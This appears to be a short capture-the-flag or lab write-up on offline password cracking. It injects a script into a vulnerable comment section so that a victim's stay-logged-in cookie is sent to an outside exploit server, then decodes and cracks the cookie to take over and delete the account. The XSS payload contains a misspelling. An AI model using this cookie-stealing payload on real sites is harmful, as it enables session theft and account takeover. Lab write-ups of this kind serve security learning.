# Offline Password Cracking

This lab includes both bypassing of authentication along with the use of a XSS vulnrability in order to get into Carlos' account

# Method

First, we need to find Carlos' stay-logged-in cookie. To do this we first will need to perform XSS in the form of the vulnrable comment sections. We will insert a comment in the form of

    <script>document.location='http://myexploitserver.com'+documnent.cookie</script>

This will give us Carlos' stay-logged-in cookie, after this we simply base64 decode it and then unhash the hashed part which is just his password. After this use the login credentials to log into carlos' account and delete it. 

# Takeaway

The biggest takeaway from this lab is the use of XSS in order to grab something like a cookie which, if we are lucky, is simply in the form of username:password.
